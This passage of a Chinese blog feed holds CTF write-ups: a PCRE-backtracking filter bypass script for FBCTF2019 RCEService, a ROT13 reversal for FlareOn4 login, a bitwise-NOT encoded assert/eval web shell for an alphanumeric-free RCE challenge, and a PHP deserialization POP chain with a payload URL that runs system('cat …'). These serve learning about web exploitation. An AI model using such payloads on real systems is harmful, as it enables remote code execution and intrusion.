/home/rceservice&quot;</span>%</span>0a&#125;<br></code></pre></td></tr></table></figure><p><img src="https://github.com/sawtooth384/image/raw/master/20230904/2023090401.6rx1bebl22c0.png" alt="2023090401"></p><p>查看flag:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=&#123;%0a<span class="hljs-string">&quot;cmd&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%</span>0a&#125;<br></code></pre></td></tr></table></figure><p><img src="https://github.com/sawtooth384/image/raw/master/20230904/2023090402.3rgu92zlvme0.png" alt="2023090402"></p><h3 id="2-利用PCRE回溯来绕过"><a href="#2-利用PCRE回溯来绕过" class="headerlink" title="2. 利用PCRE回溯来绕过"></a>2. 利用PCRE回溯来绕过</h3><p>原理详见：<a href="https://www.freebuf.com/articles/web/190794.html">PHP利用PCRE回溯次数限制绕过某些安全限制 </a>  </p><p>大概就是<code>preg_match()</code>这个函数有回溯次数限制，突破限制会返回<code>flase</code>。</p><p>只要让它突破限制就行了。</p><p>根据这种方法解题，需要用POST发送请求，因为GET会因为头太大报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">### 不知道为啥这里用 || 不可以执行我们的命令</span><br>payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;nayi&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">##超过一百万，这里写一千万不会出结果。</span><br><br>res = requests.post(<span class="hljs-string">&quot;http://b27f0703-fe79-470f-b1fb-f7cfbd8c966b.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="https://github.com/sawtooth384/image/raw/master/20230904/2023090403.2nvknqzs4l00.png" alt="2023090403"></p><h2 id="参考（引用）"><a href="#参考（引用）" class="headerlink" title="参考（引用）"></a>参考（引用）</h2><p>[<a href="https://blog.csdn.net/RABCDXB/article/details/119306689">FBCTF2019]RCEService_[fbctf 2019]rceservice_Sk1y的博客-CSDN博客</a> </p><p>[<a href="https://mayi077.gitee.io/2020/04/21/FBCTF2019-RCEService/">FBCTF2019]RCEService | 信安小蚂蚁 (gitee.io)</a>  </p><p>[<a href="https://www.cnblogs.com/Article-kelp/p/16046129.html">BUUCTF题解][FBCTF2019]RCEService - Article_kelp - 博客园 (cnblogs.com)</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>PHP</tag>
      
      <tag>正则</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu FlareOn4 login</title>
    <link href="/2023/09/02/%5BFlareOn4%5Dlogin/"/>
    <url>/2023/09/02/%5BFlareOn4%5Dlogin/</url>
    
    <content type="html"><![CDATA[<h1 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h1><p>直接看JS</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;prompt&quot;</span>).<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> flag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;flag&quot;</span>).<span class="hljs-property">value</span>;<br><span class="hljs-keyword">var</span> rotFlag = flag.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);<br>&#125;);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Correct flag!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Incorrect flag, rot again&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);  <br></code></pre></td></tr></table></figure><blockquote><p>这句代码的意思就是将字符后移13位，越界了就转到26个字母的开头（超过Z循环回A），循环进行</p></blockquote><p>一共就26个字母，一个字母这样操作两次不就回去了嘛，还是原来那个字母。</p><p>所以给这句代码再运行一次就行了。</p><p><del>懒得写脚本了，</del>直接在原代码上修改:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> flag = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">var</span> rotFlag = <span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>;<br>flag = rotFlag.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><blockquote><p>JavaScript 没有任何打印或者输出的函数。</p></blockquote><p><del>tnnd</del> 还要想办法输出。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> rotFlag = <span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>;</span><br><span class="language-javascript">        flag = rotFlag.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flag);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bod</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">htm</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最后在控制台看到输出</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230902/2023090201.9ovhjcnt9uc.png" alt="2023090201"></p>]]></content>
    
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2019 RCE ME</title>
    <link href="/2023/09/01/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/"/>
    <url>/2023/09/01/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;       <span class="hljs-comment">//长度限制</span><br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;   <span class="hljs-comment">//$code中不能出现字母和数字</span><br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// ?&gt;</span><br></code></pre></td></tr></table></figure><p>这是一道<strong>无字母数字RCE</strong>  </p><p>绕过方法有很多，比如<strong>取反</strong>、<strong>异或</strong>等。</p><p>传入<code>phpinfo()</code>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlende</span>(~(<span class="hljs-string">&quot;phpinfo&quot;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//%8F%97%8F%96%91%99%90</span><br></code></pre></td></tr></table></figure><blockquote><p>直接将命令异或或者取反即可 取反后也有带数字字母的编码，为什么就可以呢，因为取反后url进行编码会将其编码为无法识别的字符，从而绕过无字母无数字的过滤</p><p>还有为什么不能直接<code>phpinfo()</code>取反 </p><p>当 <code>(~%8F%97%8F%96%91%99%90%D7%D6);</code>被当作代码执行时的第一步就是取反操作 <code>~</code></p><p>但是取反得到的字符串 <code>phpinfo()</code>并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 <code>phpinfo()</code></p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>)()<span class="hljs-comment">;  //注意~在括号里面，最后要带；</span><br></code></pre></td></tr></table></figure><p>这样相当于<code>&quot;phpinfo&quot;();</code>，即<code>phpinfo();</code> <em>(php可变函数)</em></p><p><img src="https://github.com/sawtooth384/image/raw/master/20230901/2023090101.62vljstt0t80.png" alt="2023090101"></p><p>禁用了很多函数  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">pcntl_alarm<br>pcntl_fork,<br>pcntl_waitpid,<br>pcntl_wait,<br>pcntl_wifexited,<br>pcntl_wifstopped,<br>pcntl_wifsignaled,<br>pcntl_wifcontinued,<br>pcntl_wexitstatus,<br>pcntl_wtermsig,<br>pcntl_wstopsig,<br>pcntl_signal,<br>pcntl_signal_get_handler,<br>pcntl_signal_dispatch,<br>pcntl_get_last_error,<br>pcntl_strerror,<br>pcntl_sigprocmask,<br>pcntl_sigwaitinfo,<br>pcntl_sigtimedwait,<br>pcntl_exec,<br>pcntl_getpriority,<br>pcntl_setpriority,<br>pcntl_async_signals,<br>system,exec,<br>shell_exec,<br>popen,<br>proc_open,<br>passthru,<br>symlink,<br>link,<br>syslog,<br>imap_open,<br>ld,<br>dl<br></code></pre></td></tr></table></figure><blockquote><p>为了安全起见，很多运维人员会禁用<code>PHP</code>的一些“危险”函数，例如<code>eval</code>、exec、system等，将其写在<code>php.ini</code>配置文件中，就是我们所说的<code>disable_functions</code>了，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在<code>disable_functions</code>的设置中也通常较为严格。如果在渗透时，上传了<code>webshell</code>却因为<code>disable_functions</code>禁用了我们函数而无法执行命令的话，这时候就需要想办法进行绕过，突破<code>disable_functions</code>。  </p></blockquote><h2 id="构造shell"><a href="#构造shell" class="headerlink" title="构造shell"></a>构造shell</h2><blockquote><p>在这里，我们不能直接使用eval 因为  所以为我们无法通过变量函数的方法进行调用。<br>在这里，我们使用 assert 来构造，但由于php版本问题，我们并不能直接构造&lt;?php assert($_POST[‘a’]);&gt;</p><p>我们需要调用eval<br>拼接为 <code>assert（eval($_POST[test])）</code></p></blockquote><p><em>翻了十几篇博客，大部分没有解释这个马是怎么来的，只找到这个不怎么清楚的解释</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])); <span class="hljs-comment">#assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。</span><br></code></pre></td></tr></table></figure><p>构造脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;(eval($_POST[1]))&#x27;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br> <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//%9E%8C%8C%9A%8D%8B&lt;br&gt;%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>B)(~<span class="hljs-variable">%D7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%D6</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>蚁剑连接 </p><p>根目录里有flag和readflag </p><p>flag读不了，只能尝试运行readflag</p><p>而绕过diseable_funtion才能运行readflag  </p><p>可使用蚁剑插件</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230901/2023090102.7fs1bcxw1s40.png" alt="2023090102"></p><p>得到flag</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230901/2023090103.2u68kgwae6w0.png" alt="2023090103"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情 - FreeBuf网络安全行业门户</a> </p><p>[<a href="https://www.cnblogs.com/l0vehzzz/p/16424027.html">极客大挑战 2019]RCE ME - L0VEhzzz - 博客园 (cnblogs.com)</a> </p><p>[BUUCTF：<a href="https://blog.csdn.net/m0_62879498/article/details/124803318">极客大挑战 2019]RCE ME ——两种方法_hcjtn的博客-CSDN博客</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>easy_serialize</title>
    <link href="/2023/04/23/easy-serialize/"/>
    <url>/2023/04/23/easy-serialize/</url>
    
    <content type="html"><![CDATA[<h1 id="easy-serialize"><a href="#easy-serialize" class="headerlink" title="easy_serialize"></a>easy_serialize</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>先上payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://124.220.165.133:9906/?a=O:5:&quot;Hello&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:5:&quot;Uwant&quot;:1:&#123;s:6:&quot;params&quot;;s:32:&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;;&#125;&#125;&#125;;&#125;<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先把网页上的代码拷到vscode里，以便后续查看和修改  </p><p><img src="https://github.com/sawtooth384/image/raw/master/20230423/e1.35gzqjp3uli0.png" alt="e1">  </p><p>第40行有个<code>eval</code>函数，那就从这里倒推</p><p><code>eval</code>在<code>getshell</code>函数里，而<code>getshell</code>被<code>__get</code>函数调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()        <span class="hljs-comment">#当一个对象创建时触发     </span><br> <span class="hljs-title function_ invoke__">__destruct</span>()        <span class="hljs-comment">#当一个对象被销毁时触发      </span><br> <span class="hljs-title function_ invoke__">__toString</span>()        <span class="hljs-comment">#把类当作字符串使用时触发      </span><br> <span class="hljs-title function_ invoke__">__get</span>()             <span class="hljs-comment">#用于从不存在或不可访问的属性读取数据时      </span><br></code></pre></td></tr></table></figure><p>显然，在<code>Show</code>类的<code>__tostring()</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当<code>$this-&gt;str[&#39;str&#39;]</code>为类<code>Uwant</code>时，</p><p>这段代码会调用<code>Uwant</code>中不存在的<code>source</code>变量，导致触发<code>__get()</code>  </p><p>接下来，我们分析如何触发<code>__toString()</code>  </p><p>在<code>Hello</code>类中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str=<span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source=<span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;      <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果<code>$this-&gt;source</code>为一个<code>Show</code>类的对象，</p><p>那么<code>__destruct()</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br></code></pre></td></tr></table></figure><p>就是将<code>Show</code>类对象当作字符串使用，</p><p>即触发<code>__toString()</code>  </p><h2 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h2><p>我们需要序列化一个<code>Hello</code>类对象，</p><p>这个对象的<code>$str</code>为一个<code>Show</code>类对象，</p><p>该<code>Show</code>类对象的<code>$str[&#39;str&#39;]</code>为一个<code>Uwant</code>类对象。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uwant</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>=<span class="hljs-string">&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>;<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br><span class="hljs-variable">$a</span>-&gt;str-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uwant</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://124.220.165.133:9906/?a=O:5:&quot;Hello&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:5:&quot;Uwant&quot;:1:&#123;s:6:&quot;params&quot;;s:32:&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;;&#125;&#125;&#125;;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>wp</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web第一周</title>
    <link href="/2023/01/15/web%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <url>/2023/01/15/web%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
    
